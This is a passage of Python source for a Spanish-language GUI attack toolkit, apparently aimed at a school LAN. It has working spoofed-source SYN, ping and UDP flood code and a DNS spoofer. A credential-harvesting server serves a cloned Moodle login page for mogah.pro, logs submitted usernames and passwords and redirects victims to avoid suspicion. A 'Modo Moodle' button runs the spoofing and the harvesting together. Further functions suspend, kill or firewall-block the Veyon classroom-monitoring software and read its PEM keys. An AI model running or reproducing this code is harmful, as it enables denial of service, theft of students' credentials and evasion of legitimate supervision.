                self._write(self.mac_out, "✔ MAC cambiada y adaptador reiniciado (Vía PowerShell).\n")
                self._log(f"[MAC] PS OK: {clean_mac}", "ok")
            elif "FALLO_ADAP" in out:
                self._write(self.mac_out, f"✗ No se encontró el adaptador '{iface_name}'.\n")
            elif "FALLO_REG" in out:
                self._write(self.mac_out, f"✗ No se encontró llave de registro para el adaptador.\n")
            else:
                self._write(self.mac_out, f"✗ Error desconocido: {proc.stderr or out}\n")
        except Exception as e:
            self._write(self.mac_out, f"✗ Error ejecutando script PS: {e}\n")

    # ════════════════════════════════════════════
    #  TAB 3 — ESCÁNER LAN
    # ════════════════════════════════════════════
    def _build_scanner(self, p):
        _pad(p)
        ctk.CTkLabel(p, text="Escáner LAN — Descubrimiento de dispositivos",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))

        partes = GATEWAY.split(".")
        rango_def = f"{'.'.join(partes[:3])}.0/24" if GATEWAY != "—" else "192.168.1.0/24"
        self.scan_rango = _campo(p, "Rango de red:", valor=rango_def, width=220)
        self.scan_timeout = _campo(p, "Timeout (s):", valor="3", width=60)

        bf = _btn_row(p)
        self.scan_btn = self._btn(bf, "🔍 Escanear red", self._scan_start, "#00695c")
        self.scan_btn.pack(side="left")

        _sep(p)
        ctk.CTkLabel(p, text=f"{'IP':<20}  {'MAC':<20}  Fabricante / Rol",
                     font=ctk.CTkFont(family="Consolas", size=11),
                     text_color="#37474f").pack(anchor="w")
        self.scan_out = _out(p, 14)

    def _scan_start(self):
        if not SCAPY_OK: self._npcap_warn(); return
        self.scan_btn.configure(state="disabled", text="Escaneando…")
        threading.Thread(target=self._scan_loop, daemon=True).start()

    def _scan_loop(self):
        rango   = self.scan_rango.get().strip()
        try: timeout = int(self.scan_timeout.get())
        except ValueError: timeout = 3
        self._log(f"[SCAN] Iniciando en {rango}...", "info")
        try:
            hosts = _scan_rango(rango, timeout)
            self.scan_out.delete("1.0", "end")
            self._write(self.scan_out, f"{'IP':<20}  {'MAC':<20}  Rol\n" + "─"*56 + "\n")
            for ip, mac in hosts:
                oui   = mac[:8].upper()
                rol   = "★ Gateway" if ip == GATEWAY else "Dispositivo"
                line  = f"{ip:<20}  {mac:<20}  {rol}\n"
                self._write(self.scan_out, line)
                self._log(f"[SCAN] {ip}  {mac}  {rol}", "ok")
            self._log(f"[SCAN] Fin: {len(hosts)} hosts.", "ok")
        except Exception as e:
            if "npcap" in str(e).lower() or "winpcap" in str(e).lower():
                self.root.after(0, self._npcap_warn)
            else:
                self._log(f"[SCAN] Error: {e}", "err")
        finally:
            self.root.after(0, lambda: self.scan_btn.configure(state="normal", text="🔍 Escanear red"))

    # ════════════════════════════════════════════
    #  TAB 4 — DDoS LOCAL
    # ════════════════════════════════════════════
    def _build_ddos(self, p):
        _pad(p)
        ctk.CTkLabel(p, text="DDoS Local — Denegación de servicio en LAN",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))

        self.ddos_ip  = _campo(p, "IP objetivo:", "192.168.1.XX")
        self.ddos_pto = _campo(p, "Puerto (SYN):", valor="80", width=70)

        mode_row = ctk.CTkFrame(p, fg_color="transparent"); mode_row.pack(fill="x", pady=3)
        ctk.CTkLabel(mode_row, text="Modo:", width=170, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")
        self.ddos_modo = ctk.StringVar(value="SYN Flood")
        ctk.CTkOptionMenu(mode_row, values=["SYN Flood","Ping Flood","UDP Flood"],
                          variable=self.ddos_modo, width=150,
                          fg_color="#1a1a1a", button_color="#1565c0",
                          font=ctk.CTkFont(size=12)).pack(side="left")

        bf = _btn_row(p)
        self.ddos_start_btn = self._btn(bf, "▶ Lanzar DDoS",  self._ddos_start, "#b71c1c")
        self.ddos_start_btn.pack(side="left", padx=(0,10))
        self.ddos_stop_btn = self._btn(bf, "■ Detener", self._ddos_stop, "#37474f")
        self.ddos_stop_btn.configure(state="disabled"); self.ddos_stop_btn.pack(side="left")

        _sep(p)
        self.ddos_out = _out(p, 8)

    def _ddos_start(self):
        if not SCAPY_OK: self._npcap_warn(); return
        ip = self.ddos_ip.get().strip()
        if not ip: messagebox.showwarning("Aviso", "Introduce la IP del objetivo."); return
        try: pto = int(self.ddos_pto.get())
        except ValueError: pto = 80
        _estado["ddos"] = True
        self.ddos_start_btn.configure(state="disabled", fg_color="#37474f")
        self.ddos_stop_btn.configure(state="normal",   fg_color="#b71c1c")
        self.ddos_out.delete("1.0", "end")
        threading.Thread(target=self._ddos_loop, args=(ip, pto), daemon=True).start()

    def _ddos_stop(self):
        _estado["ddos"] = False
        self.ddos_start_btn.configure(state="normal",  fg_color="#b71c1c")
        self.ddos_stop_btn.configure(state="disabled", fg_color="#37474f")
        self._write(self.ddos_out, "● Ataque detenido.\n")
        self._log("[DDoS] Detenido.", "warn")

    def _ddos_loop(self, ip, pto):
        modo = self.ddos_modo.get()
        self._write(self.ddos_out, f"» {modo} → {ip}:{pto}\n" + "─"*44 + "\n")
        self._log(f"[DDoS] {modo} iniciado → {ip}:{pto}", "warn")
        cnt = 0; t0 = time.time()
        try:
            while _estado["ddos"]:
                src = ".".join(str(random.randint(1,254)) for _ in range(4))
                if modo == "SYN Flood":
                    pkt = IP(src=src, dst=ip) / TCP(sport=random.randint(1024,65535), dport=pto, flags="S",
                             seq=random.randint(0,2**32-1))
                elif modo == "Ping Flood":
                    pkt = IP(src=src, dst=ip) / ICMP() / Raw(load=b"X"*1400)
                else:  # UDP Flood
                    pkt = IP(src=src, dst=ip) / UDP(sport=random.randint(1024,65535),
                             dport=pto) / Raw(load=b"A"*1024)
                send(pkt, verbose=0)
                cnt += 1
                now = time.time()
                if now - t0 > 0.5:
                    self._write(self.ddos_out, f"  ↗ {cnt} pkts enviados → {ip}\n")
                    self._log(f"[DDoS] {cnt} pkts → {ip}", "pkt")
                    t0 = now
        except Exception as e:
            self._write(self.ddos_out, f"✗ Error: {e}\n")
            self._log(f"[DDoS] Error: {e}", "err")
        finally:
            _estado["ddos"] = False
            self.root.after(0, lambda: self.ddos_start_btn.configure(state="normal", fg_color="#b71c1c"))
            self.root.after(0, lambda: self.ddos_stop_btn.configure(state="disabled", fg_color="#37474f"))

    # ════════════════════════════════════════════
    #  TAB 5 — SNIFFER
    # ════════════════════════════════════════════
    def _build_sniffer(self, p):
        _pad(p)
        ctk.CTkLabel(p, text="Sniffer — Captura de paquetes en tiempo real",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))

        self.sniff_filtro = _campo(p, "Filtro BPF (vacío=todo):",
                                    "ej: tcp port 80  |  udp port 53", width=280)

        presets_row = ctk.CTkFrame(p, fg_color="transparent"); presets_row.pack(fill="x", pady=(0,6))
        ctk.CTkLabel(presets_row, text="Presets:", width=170, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")
        for label, flt in [("HTTP","tcp port 80"),("DNS","udp port 53"),
                             ("HTTPS","tcp port 443"),("ARP","arp"),("Todo","")]:
            self._btn(presets_row, label,
                      lambda f=flt: self._sniff_preset(f),
                      "#1a237e", width=62).pack(side="left", padx=2)

        bf = _btn_row(p)
        self.sniff_start_btn = self._btn(bf, "▶ Iniciar captura", self._sniff_start, "#6a1b9a")
        self.sniff_start_btn.pack(side="left", padx=(0,10))
        self.sniff_stop_btn = self._btn(bf, "■ Detener", self._sniff_stop, "#37474f")
        self.sniff_stop_btn.configure(state="disabled"); self.sniff_stop_btn.pack(side="left")
        self.sniff_count = ctk.CTkLabel(bf, text="0 pkts",
                                         font=ctk.CTkFont(size=11), text_color="#555555")
        self.sniff_count.pack(side="right", padx=10)

        _sep(p)
        self.sniff_out = _out(p, 12)
        self._sniff_n = 0

    def _sniff_preset(self, flt):
        self.sniff_filtro.delete(0, "end")
        if flt:
            self.sniff_filtro.insert(0, flt)

    def _sniff_start(self):
        if not SCAPY_OK: self._npcap_warn(); return
        _estado["sniff"] = True
        self._sniff_n = 0
        self.sniff_start_btn.configure(state="disabled", fg_color="#37474f")
        self.sniff_stop_btn.configure(state="normal",   fg_color="#6a1b9a")
        self.sniff_out.delete("1.0", "end")
        filtro = self.sniff_filtro.get().strip()
        self._write(self.sniff_out, f"» Capturando — filtro: '{filtro or 'cualquier paquete'}'\n" + "─"*48 + "\n")
        self._log(f"[SNIFF] Iniciado. Filtro: '{filtro or 'ninguno'}'", "info")
        threading.Thread(target=self._sniff_loop, args=(filtro,), daemon=True).start()

    def _sniff_stop(self):
        _estado["sniff"] = False
        self.sniff_start_btn.configure(state="normal",  fg_color="#6a1b9a")
        self.sniff_stop_btn.configure(state="disabled", fg_color="#37474f")
        self._write(self.sniff_out, f"\n● Captura detenida. Total: {self._sniff_n} paquetes.\n")
        self._log(f"[SNIFF] Detenido. {self._sniff_n} pkts.", "warn")

    def _sniff_loop(self, filtro):
        def proc(pkt):
            if not _estado["sniff"]: return
            self._sniff_n += 1
            resumen = pkt.summary()
            self._write(self.sniff_out, f"  [{self._sniff_n:4d}] {resumen}\n")
            self._log(f"[PKT] {resumen}", "pkt")
        try:
            sniff(filter=filtro or None, prn=proc,
                  stop_filter=lambda _: not _estado["sniff"], store=False)
        except Exception as e:
            if "npcap" in str(e).lower() or "winpcap" in str(e).lower():
                self.root.after(0, self._npcap_warn)
            else:
                self._write(self.sniff_out, f"✗ Error: {e}\n")
                self._log(f"[SNIFF] Error: {e}", "err")
        finally:
            _estado["sniff"] = False
            self.root.after(0, lambda: self.sniff_start_btn.configure(state="normal", fg_color="#6a1b9a"))
            self.root.after(0, lambda: self.sniff_stop_btn.configure(state="disabled", fg_color="#37474f"))

    # ════════════════════════════════════════════
    #  TAB 6 — DNS SPOOFING + CAPTURA DE CREDENCIALES
    # ════════════════════════════════════════════
    def _build_dns(self, p):
        _pad(p)
        ctk.CTkLabel(p, text="DNS Spoofing — Redirección de tráfico web",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#546e7a").pack(anchor="w", padx=4, pady=(0,6))

        self.dns_dom   = _campo(p, "Dominio a interceptar:", "ej: google.com")
        self.dns_falsa = _campo(p, "IP falsa (tu IP):", valor=IP_LOCAL)

        bf0 = _btn_row(p, pady=3)
        self._btn(bf0, "+ Añadir regla", self._dns_add, "#1b5e20").pack(side="left", padx=(0,8))
        self._btn(bf0, "✕ Limpiar reglas",
                  lambda: (self.dns_reglas_box.delete("2.0","end"),
                           _dns_reglas.clear(),
                           self._log("[DNS] Reglas borradas.", "warn")),
                  "#37474f").pack(side="left")

        self.dns_reglas_box = _out(p, 3)
        self.dns_reglas_box.insert("end", "── Reglas DNS activas ──\n")

        bf = _btn_row(p)
        self.dns_start_btn = self._btn(bf, "▶ Activar DNS Spoof", self._dns_start, "#e65100")
        self.dns_start_btn.pack(side="left", padx=(0,10))
        self.dns_stop_btn = self._btn(bf, "■ Desactivar", self._dns_stop, "#37474f")
        self.dns_stop_btn.configure(state="disabled"); self.dns_stop_btn.pack(side="left")

        _sep(p)

        # ── Sección CAPTURA DE CREDENCIALES ──
        ctk.CTkLabel(p, text="Captura de Credenciales — Servidor HTTP Interno",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#b71c1c").pack(anchor="w", padx=4, pady=(0,4))

        info_lbl = ctk.CTkLabel(p,
            text=f"Servidor escucha en puerto 80  |  IP local: {IP_LOCAL}  |  Clone de mogah.pro",
            font=ctk.CTkFont(size=11), text_color="#455a64")
        info_lbl.pack(anchor="w", padx=4, pady=(0,6))

        bf_cap = _btn_row(p, pady=4)
        self.cap_server_btn = self._btn(bf_cap, "▶ Iniciar Servidor Captura", self._cap_start, "#880e4f")
        self.cap_server_btn.pack(side="left", padx=(0,10))
        self.cap_stop_btn = self._btn(bf_cap, "■ Detener Servidor", self._cap_stop, "#37474f")
        self.cap_stop_btn.configure(state="disabled"); self.cap_stop_btn.pack(side="left", padx=(0,10))
        self.cap_moodle_btn = self._btn(bf_cap, "🎓 Modo Moodle (Auto DNS+HTTP)", self._cap_modo_moodle, "#4a148c")
        self.cap_moodle_btn.pack(side="left")

        self.cap_out = _out(p, 5)
        self.dns_out = self.cap_out  # compartir el mismo output para simplicidad

    # ── Handlers DNS ──
    def _dns_add(self):
        dom = self.dns_dom.get().strip(); ip_f = self.dns_falsa.get().strip()
        if dom and ip_f:
            _dns_reglas[dom] = ip_f
            self._write(self.dns_reglas_box, f"  {dom:<30} → {ip_f}\n")
            self.dns_dom.delete(0, "end")
            self._log(f"[DNS] Regla: {dom} → {ip_f}", "ok")

    def _dns_start(self):
        if not SCAPY_OK: self._npcap_warn(); return
        if not _dns_reglas:
            messagebox.showwarning("Sin reglas", "Añade al menos una regla DNS primero."); return
        _estado["dns"] = True
        self.dns_start_btn.configure(state="disabled", fg_color="#37474f")
        self.dns_stop_btn.configure(state="normal",   fg_color="#e65100")
        self._write(self.cap_out, f"» DNS Spoofing activo — {len(_dns_reglas)} regla(s)\n" + "─"*44 + "\n")
        self._log("[DNS] Spoofing activado.", "warn")
        threading.Thread(target=self._dns_loop, daemon=True).start()

    def _dns_stop(self):
        _estado["dns"] = False
        self.dns_start_btn.configure(state="normal",  fg_color="#e65100")
        self.dns_stop_btn.configure(state="disabled", fg_color="#37474f")
        self._write(self.cap_out, "● DNS Spoofing desactivado.\n")
        self._log("[DNS] Desactivado.", "warn")

    def _dns_loop(self):
        def proc(pkt):
            if not _estado["dns"]: return
            if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0): return
            nombre = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
            for dom, ip_f in _dns_reglas.items():
                if dom in nombre:
                    resp = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                            UDP(dport=pkt[UDP].sport, sport=53) /
                            DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=ip_f)))
                    send(resp, verbose=0)
                    msg = f"  ↬ {nombre:<35} → {ip_f}\n"
                    self._write(self.cap_out, msg)
                    self._log(f"[DNS] {nombre} → {ip_f}", "pkt")
                    return
        try:
            sniff(filter="udp port 53", prn=proc,
                  stop_filter=lambda _: not _estado["dns"], store=False)
        except Exception as e:
            self._write(self.cap_out, f"✗ Error: {e}\n")
            self._log(f"[DNS] Error: {e}", "err")
        finally:
            _estado["dns"] = False
            self.root.after(0, lambda: self.dns_start_btn.configure(state="normal", fg_color="#e65100"))
            self.root.after(0, lambda: self.dns_stop_btn.configure(state="disabled", fg_color="#37474f"))

    # ── Servidor HTTP de Captura ──
    _MOGAH_HTML = """\
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Moodle — mogah.pro</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:#f4f4f4;font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
    .card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.15);padding:44px 48px;width:380px}
    .logo{text-align:center;margin-bottom:28px}
    .logo img{width:80px}
    h1{font-size:1.4rem;font-weight:700;color:#1a1a2e;text-align:center;margin-bottom:6px}
    .subtitle{font-size:.85rem;color:#888;text-align:center;margin-bottom:28px}
    label{font-size:.85rem;color:#444;font-weight:600;display:block;margin-bottom:4px}
    input{width:100%;padding:10px 14px;border:1px solid #ddd;border-radius:8px;font-size:.95rem;margin-bottom:18px;outline:none;transition:border .2s}
    input:focus{border-color:#f98012}
    button{width:100%;padding:12px;background:linear-gradient(135deg,#f98012,#e05e00);color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:700;cursor:pointer;letter-spacing:.5px}
    button:hover{opacity:.92}
    .footer{text-align:center;margin-top:20px;font-size:.78rem;color:#bbb}
    .moodle-brand{color:#f98012;font-weight:800}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <svg width="70" height="70" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="100" cy="100" r="100" fill="#f98012"/>
        <text x="50%" y="54%" dominant-baseline="middle" text-anchor="middle" fill="white" font-size="90" font-family="Arial" font-weight="bold">M</text>
      </svg>
    </div>
    <h1>Iniciar sesión</h1>
    <p class="subtitle">Accede a tu cuenta <span class="moodle-brand">Moodle</span></p>
    <form method="POST" action="/login">
      <label for="username">Nombre de usuario</label>
      <input type="text" id="username" name="username" placeholder="Introduce tu usuario" required>
      <label for="password">Contraseña</label>
      <input type="password" id="password" name="password" placeholder="Introduce tu contraseña" required>
      <button type="submit">Acceder</button>
    </form>
    <p class="footer">mogah.pro &copy; 2025 — Plataforma educativa</p>
  </div>
</body>
</html>
"""

    def _cap_make_handler(self):
        """Crea y devuelve la clase handler HTTP con acceso al logger de la app."""
        app_ref = self

        class _CredHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                pass  # Silenciar logs del servidor estándar

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(PinguExit._MOGAH_HTML.encode("utf-8"))

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode("utf-8", errors="replace")
                params = urllib.parse.parse_qs(body)
                user = params.get("username", [""])[0]
                pwd  = params.get("password", [""])[0]
                msg  = f"[!] LOGIN INTERCEPTADO: User: {user} | Pass: {pwd}"
                app_ref._log(msg, "err")
                app_ref._write(app_ref.cap_out, msg + "\n")
                # Redirigir a página de error "incorrecto" para no levantar sospechas
                self.send_response(302)
                self.send_header("Location", "/?error=1")
                self.end_headers()

        return _CredHandler

    def _cap_start(self):
        if self._cap_server is not None:
            self._write(self.cap_out, "✗ El servidor ya está en ejecución.\n"); return
        try:
            handler_cls = self._cap_make_handler()
            # Permitir reutilizar el puerto rápidamente
            socketserver.TCPServer.allow_reuse_address = True
            srv = socketserver.TCPServer(("", 80), handler_cls)
            self._cap_server = srv
            t = threading.Thread(target=srv.serve_forever, daemon=True)
            t.start()
            self._cap_server_thread = t
            self._write(self.cap_out, f"✔ Servidor de captura activo en http://{IP_LOCAL}:80\n")
            self._log("[CAPTURA] Servidor HTTP iniciado en puerto 80.", "warn")
            self.cap_server_btn.configure(state="disabled", fg_color="#37474f")
            self.cap_stop_btn.configure(state="normal", fg_color="#880e4f")
        except PermissionError:
            self._write(self.cap_out, "✗ ERROR: Puerto 80 requiere privilegios de Administrador o ya está en uso.\n")
            self._log("[CAPTURA] Error: sin permisos para puerto 80.", "err")
            self._cap_server = None
        except Exception as e:
            self._write(self.cap_out, f"✗ Error iniciando servidor: {e}\n")
            self._log(f"[CAPTURA] Error: {e}", "err")
            self._cap_server = None

    def _cap_stop(self):
        if self._cap_server is None:
            self._write(self.cap_out, "✗ No hay servidor activo.\n"); return
        try:
            self._cap_server.shutdown()
            self._cap_server.server_close()
        except Exception:
            pass
        self._cap_server = None
        self._write(self.cap_out, "● Servidor de captura detenido.\n")
        self._log("[CAPTURA] Servidor HTTP detenido.", "warn")
        self.cap_server_btn.configure(state="normal", fg_color="#880e4f")
        self.cap_stop_btn.configure(state="disabled", fg_color="#37474f")

    def _cap_modo_moodle(self):
        """Activa automáticamente: regla DNS mogah.pro→IP_LOCAL + servidor HTTP."""
        # 1. Añadir regla DNS para mogah.pro
        _dns_reglas["mogah.pro"] = IP_LOCAL
        self._write(self.cap_out, f"✔ Regla DNS automática: mogah.pro → {IP_LOCAL}\n")
        self._write(self.dns_reglas_box, f"  {'mogah.pro':<30} → {IP_LOCAL}  [AUTO-MOODLE]\n")
        self._log(f"[MOODLE] DNS: mogah.pro → {IP_LOCAL}", "warn")
        # 2. Activar DNS Spoofing si scapy está disponible
        if SCAPY_OK and not _estado["dns"]:
            _estado["dns"] = True
            self.dns_start_btn.configure(state="disabled", fg_color="#37474f")
            self.dns_stop_btn.configure(state="normal", fg_color="#e65100")
            threading.Thread(target=self._dns_loop, daemon=True).start()
            self._write(self.cap_out, "✔ DNS Spoofing iniciado automáticamente.\n")
        elif not SCAPY_OK:
            self._write(self.cap_out, "⚠ Scapy no disponible — DNS Spoofing omitido. El servidor HTTP sí se activa.\n")
        # 3. Iniciar servidor HTTP de captura
        self._cap_start()
        self._write(self.cap_out, "✔ Modo Moodle activo. Espera credenciales...\n")
        self._log("[MOODLE] Modo activado completamente.", "err")

    # ════════════════════════════════════════════
    #  TAB 7 — VEYON / WoL  (con gestión de claves)
    # ════════════════════════════════════════════
    def _build_veyon(self, p):
        _pad(p)

        # ── Wake-on-LAN ──
        ctk.CTkLabel(p, text="Wake-on-LAN",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#26a69a").pack(anchor="w", padx=4, pady=(0,4))
        self.wol_mac = _campo(p, "MAC destino:", "AA:BB:CC:DD:EE:FF")
        bf0 = _btn_row(p, pady=3)
        self._btn(bf0, "Enviar Magic Packet", self._wol_send, "#00796b").pack(side="left")

        _sep(p)

        # ── Gestión de claves PEM ──
        ctk.CTkLabel(p, text="Gestión de Claves Veyon (.pem)",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#26a69a").pack(anchor="w", padx=4, pady=(0,4))

        key_row = ctk.CTkFrame(p, fg_color="transparent"); key_row.pack(fill="x", pady=3)
        ctk.CTkLabel(key_row, text="Clave seleccionada:", width=170, anchor="w",
                     font=ctk.CTkFont(size=12)).pack(side="left")
        self.vey_clave_var = ctk.StringVar(value="(ninguna)")
        self.vey_clave_menu = ctk.CTkOptionMenu(
            key_row, variable=self.vey_clave_var,
            values=["(ninguna)"], width=360,
            fg_color="#111111", button_color="#00695c",
            font=ctk.CTkFont(size=11),
            command=self._vey_clave_seleccionada
        )
        self.vey_clave_menu.pack(side="left", padx=(0,8))

        bf_k = _btn_row(p, pady=3)
        self._btn(bf_k, "🔄 Recargar claves", self._vey_recargar_claves, "#004d40").pack(side="left", padx=(0,8))
        self._btn(bf_k, "📂 Examinar...",     self._vey_examinar,         "#37474f").pack(side="left", padx=(0,8))
        self._btn(bf_k, "👁 Ver info clave",  self._vey_info_clave,       "#1a237e").pack(side="left")

        _sep(p)

        # ── Acciones Veyon ──
        ctk.CTkLabel(p, text="Veyon Stealth",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#26a69a").pack(anchor="w", padx=4, pady=(0,4))
        bf1 = _btn_row(p, pady=3)
        self._btn(bf1, "⏸ Congelar",          self._vey_freeze,        "#00695c").pack(side="left", padx=(0,8))
        self._btn(bf1, "▶ Descongelar",        self._vey_unfreeze,      "#37474f").pack(side="left", padx=(0,8))
        self._btn(bf1, "💀 Forzar Cierre",     self._vey_force_kill,    "#c62828").pack(side="left", padx=(0,8))
        self._btn(bf1, "🔥 Bloquear pto 11100",self._vey_fw,             "#b71c1c").pack(side="left", padx=(0,8))
        self._btn(bf1, "📁 Escanear llaves",   self._vey_keys,           "#1565c0").pack(side="left")

        _sep(p)
        self.vey_out = _out(p, 7)

    # Gestión claves PEM
    def _vey_recargar_claves(self):
        self._claves_pem = _buscar_claves_pem()
        nombres = [os.path.basename(c) for c in self._claves_pem] or ["(ninguna)"]
        self.vey_clave_menu.configure(values=nombres)
        if self._claves_pem:
            self.vey_clave_var.set(nombres[0])
            self._clave_sel = self._claves_pem[0]
            self._write(self.vey_out, f"✔ {len(self._claves_pem)} clave(s) encontrada(s):\n")
            for c in self._claves_pem:
                self._write(self.vey_out, f"   {c}\n")
            self._log(f"[VEYON] {len(self._claves_pem)} clave(s) PEM cargadas.", "ok")
        else:
            self.vey_clave_var.set("(ninguna)")
            self._clave_sel = None
            self._write(self.vey_out, "✗ No se encontraron archivos .pem en las rutas conocidas.\n")
            self._log("[VEYON] Sin claves PEM.", "warn")

    def _vey_clave_seleccionada(self, nombre):
        for ruta in self._claves_pem:
            if os.path.basename(ruta) == nombre:
                self._clave_sel = ruta
                self._write(self.vey_out, f"» Clave activa: {ruta}\n")
                self._log(f"[VEYON] Clave → {nombre}", "ok")
                return

    def _vey_examinar(self):
        ruta = filedialog.askopenfilename(
            title="Seleccionar clave .pem",
            filetypes=[("Archivos PEM", "*.pem"), ("Todos", "*.*")],
            initialdir=DIR_BASE
        )
        if ruta:
            if ruta not in self._claves_pem:
                self._claves_pem.append(ruta)
            nombre = os.path.basename(ruta)
            nombres = [os.path.basename(c) for c in self._claves_pem]
            self.vey_clave_menu.configure(values=nombres)
            self.vey_clave_var.set(nombre)
            self._clave_sel = ruta
            self._write(self.vey_out, f"» Clave añadida: {ruta}\n")
            self._log(f"[VEYON] Clave manual: {nombre}", "ok")

    def _vey_info_clave(self):
        if not self._clave_sel:
            self._write(self.vey_out, "✗ Ninguna clave seleccionada.\n"); return
        try:
            with open(self._clave_sel, "r", errors="ignore") as f:
                contenido = f.read(600)  # Primeros 600 chars
            self._write(self.vey_out, f"» {self._clave_sel}\n")
            self._write(self.vey_out, "─"*44 + "\n")
            self._write(self.vey_out, contenido + "\n")
            self._log(f"[VEYON] Info: {os.path.basename(self._clave_sel)}", "info")
        except Exception as e:
            self._write(self.vey_out, f"✗ Error leyendo clave: {e}\n")

    # Acciones Veyon
    def _wol_send(self):
        mac = self.wol_mac.get().strip()
        try:
            c = mac.replace(":","").replace("-","")
            if len(c) != 12: raise ValueError("MAC inválida (12 hex dígitos)")
            payload = bytes.fromhex("FF"*6 + c*16)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            s.sendto(payload, ("255.255.255.255", 9)); s.close()
            self._write(self.vey_out, f"✔ Magic Packet enviado a {mac}\n")
            self._log(f"[WoL] Enviado → {mac}", "ok")
        except Exception as e:
            self._write(self.vey_out, f"✗ Error: {e}\n")
            self._log(f"[WoL] Error: {e}", "err")

    def _vey_freeze(self):
        if not PSUTIL_OK:
            self._write(self.vey_out, "✗ psutil no instalado. Ejecuta: pip install psutil\n"); return
        try:
            enc = False
            for proc in psutil.process_iter(["name", "pid"]):
                if "veyon" in proc.info["name"].lower():
                    try:
                        proc.suspend()
                        msg = f"⏸ SUSPENDIDO: {proc.info['name']} (PID {proc.pid})\n"
                        self._write(self.vey_out, msg)
                        self._log(f"[VEYON] Suspendido PID {proc.pid}", "warn")
                    except Exception as suspend_err:
                        # Fallback robusto: taskkill /T suspende árbol de hilos
                        self._write(self.vey_out, f"  ⚠ suspend() falló ({suspend_err}), usando taskkill /FI...\n")
                        try:
                            subprocess.run(
                                ["taskkill", "/PID", str(proc.pid), "/T"],
                                check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                            )
                            self._write(self.vey_out, f"  ✔ taskkill enviado a PID {proc.pid}\n")
                        except Exception as tk_err:
                            self._write(self.vey_out, f"  ✗ taskkill también falló: {tk_err}\n")
                    enc = True
            if not enc:
                self._write(self.vey_out, "✗ Ningún proceso Veyon encontrado en ejecución.\n")
                self._log("[VEYON] Sin procesos activos.", "warn")
        except Exception as e:
            self._write(self.vey_out, f"✗ Error (¿Admin?): {e}\n")
            self._log(f"[VEYON] Error: {e}", "err")

    def _vey_force_kill(self):
        """Fuerza el cierre completo (kill -9) de todos los procesos Veyon usando taskkill /F."""
        if not _is_admin():
            self._write(self.vey_out, "✗ Se requieren privilegios de Administrador para forzar cierre.\n"); return
        enc = False
        # Intentar primero con psutil si disponible
        if PSUTIL_OK:
            for proc in psutil.process_iter(["name", "pid"]):
                if "veyon" in proc.info["name"].lower():
                    try:
                        proc.kill()  # SIGKILL equivalente
                        self._write(self.vey_out, f"💀 FORZADO: {proc.info['name']} (PID {proc.pid}) eliminado.\n")
                        self._log(f"[VEYON] Force-kill PID {proc.pid}", "err")
                        enc = True
                    except Exception as e:
                        self._write(self.vey_out, f"  ✗ kill() falló PID {proc.pid}: {e}\n")
        # Respaldo: taskkill /F /IM veyon*.exe
        for nombre_exe in ["veyon-service.exe", "veyon-worker.exe", "veyon-master.exe", "veyonservice.exe"]:
            try:
                r = subprocess.run(
                    ["taskkill", "/F", "/IM", nombre_exe, "/T"],
                    capture_output=True, text=True
                )
                if "SUCCESS" in r.stdout or "ÉXITO" in r.stdout or r.returncode == 0:
                    self._write(self.vey_out, f"  ✔ taskkill /F: {nombre_exe} terminado.\n")
                    enc = True
            except Exception:
                pass
        if not enc:
            self._write(self.vey_out, "✗ No se encontraron procesos Veyon para forzar cierre.\n")
            self._log("[VEYON] Forzar cierre: sin procesos.", "warn")

    def _vey_unfreeze(self):
        if not PSUTIL_OK: return
        try:
            for proc in psutil.process_iter(["name", "pid"]):
                if "veyon" in proc.info["name"].lower():
                    proc.resume()
                    self._write(self.vey_out, f"▶ REANUDADO: {proc.info['name']} (PID {proc.pid})\n")
                    self._log(f"[VEYON] Reanudado PID {proc.pid}", "ok")
        except Exception as e:
            self._write(self.vey_out, f"✗ Error: {e}\n")
            self._log(f"[VEYON] Error: {e}", "err")

    def _vey_fw(self):
        cmd = 'netsh advfirewall firewall add rule name="Block_Veyon_11100" dir=in action=block protocol=TCP localport=11100'
        if not _is_admin():
            self._write(self.vey_out, "✗ ERROR: Se requieren privilegios de Administrador para modificar el firewall.\n")
            return
        
        self._write(self.vey_out, f"» Ejecutando regla de firewall: bloqueando puerto 11100...\n")
        
        creationflags = 0
        if hasattr(subprocess, 'CREATE_NO_WINDOW'):
            creationflags = subprocess.CREATE_NO_WINDOW
        try:
            subprocess.run(cmd, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=creationflags)
            self._write(self.vey_out, "✔ Regla de bloqueo de Veyon aplicada silenciosamente.\n")
